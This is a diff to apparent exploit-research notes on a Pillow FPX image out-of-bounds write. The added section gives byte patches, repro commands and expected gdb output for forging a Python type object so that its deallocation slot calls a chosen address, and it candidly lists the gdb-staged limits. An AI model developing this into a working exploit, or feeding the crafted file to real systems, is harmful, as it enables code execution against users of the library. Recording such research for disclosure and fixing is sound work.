@@ -221,3 +221,42 @@ under the same restore. The GC-flag mechanism is an inference; the
 differential is observed. No chosen-code call, marker or PC control.
 W74 (#947) also replayed the long-type differential from the witness's own
 builds: ESTABLISHED AS CLAIMED with the GC-flag mechanism still INFERENCE.
+
+## W5 — forged-type slot call to a chosen address (2026-11-21)
+
+New artifacts: `case_fake.fpx` (SHA-256
+`6c59dd01bc9c8a77e7d84d77b8ef8b79f77d2b3ef7678b880604098f80ffedea`),
+`pattern_fake.hex`, `forged_type_call.gdb`/`.log`,
+`forged_type_control.gdb`/`.log`, `forged_type_self.gdb`/`.log`.
+
+`pattern_fake.hex` is `pattern_full.hex` with bytes 184-191 set to
+`90 2f d3 00 00 00 00 00` (`0xd32f90`). Regenerate with:
+
+```
+PYTHONPATH=/tmp/pw2-w2/v12plain python3 make_case.py case_fake.fpx 256 0xa5 64 64 \
+  "$(cat pattern_fake.hex)" 64
+```
+
+The stronger run, where the OOB write itself supplies the pointer:
+
+```
+PYTHONPATH=/tmp/pw2-w2/v12plain gdb -q -batch -x forged_type_self.gdb --args python3 -c \
+  'from PIL import Image; Image.open("case_fake.fpx").load()'
+```
+
+Expected (`forged_type_self.log`): tile buffer at `0xd32d90`,
+`AFTER_DECODE type=d32f90 fake=d32f90`, `OBTYPE_FROM_OOB=d32f90
+forged_slot=45e6e6 MATCH=1`, then
+`Breakpoint 2, 0x000000000045e6e6 in _PyObject_Dump ()` after the gdb-invoked
+`_Py_Dealloc`. The script stages a 416-byte copy of `PyUnicode_Type` at
+`buffer+512` (inside the OOB span, `sizeof(PyTypeObject)=416`, `tp_dealloc` at
+offset 48 in Python 3.12) with only `tp_dealloc` changed to `0x45e6e6`, and
+snapshots the past-end span in two pieces so the OOB-written `ob_type`
+survives the restore. `forged_type_control.gdb` leaves `tp_dealloc` at the
+copied real value: the marker breakpoint is NOT hit and the process faults in
+`PyObject_Free()` instead.
+
+Limit: the deallocation call is invoked from gdb, the fake type is staged by
+gdb, the build is non-PIE with a deterministic brk address, and the marker is
+an existing static function address. No injected code, natural trigger, PC
+write or ASLR leak was demonstrated; grade stays ◐.
